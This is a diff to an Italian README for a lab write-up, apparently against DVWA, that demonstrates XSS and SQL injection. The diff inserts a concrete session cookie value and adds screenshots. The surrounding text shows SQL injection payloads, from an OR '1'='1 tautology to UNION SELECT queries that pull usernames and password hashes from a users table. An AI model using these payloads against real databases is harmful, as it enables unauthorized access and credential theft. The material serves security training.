@@ -38,7 +38,7 @@ Questo progetto dimostra lo sfruttamento delle vulnerabilità di **XSS (Cross-Si
 ![CookieAttuali](./CookieAttuali.png)
 
    - Visualizzati i cookie correnti della sessione:
-     - `security=low; PHPSESSID=<session_id>`
+     - `security=low; PHPSESSID=33f1cf72392507564726cf2cbd4b73c2`
 
 ---
 
@@ -53,6 +53,8 @@ Questo progetto dimostra lo sfruttamento delle vulnerabilità di **XSS (Cross-Si
      ```sql
      ' OR '1'='1
      ```
+![OR '1'='1](./OR11.png)
+
    - Confermato l'accesso a tutti i record della tabella `users`.
 
 3. **Scoperta del numero di colonne**:
@@ -60,22 +62,21 @@ Questo progetto dimostra lo sfruttamento delle vulnerabilità di **XSS (Cross-Si
      ```sql
      ' UNION SELECT null, null--
      ```
+![Scoperte Colonne](./ScoperteColonne.png)
 
 4. **Estrazione di dati specifici**:
    - Ottenuti i valori delle colonne **first_name** e **last_name**:
      ```sql
      ' UNION SELECT first_name, last_name FROM users--
      ```
+![Ottenuti Valori](./OttenutiValori.png)
+
    - Successivamente, estratti i dati delle colonne **user** e **password**:
      ```sql
      ' UNION SELECT user, password FROM users--
      ```
 
 5. **Risultati ottenuti**:
-   - Utenti e hash delle password:
-     - Esempio:
-       - User: `admin`
-       - Password (hash): `5f4dcc3b5aa765d61d8327deb882cf99`
 
 ![Estrazuserpassword](./Estrazuserpassword.png)
 
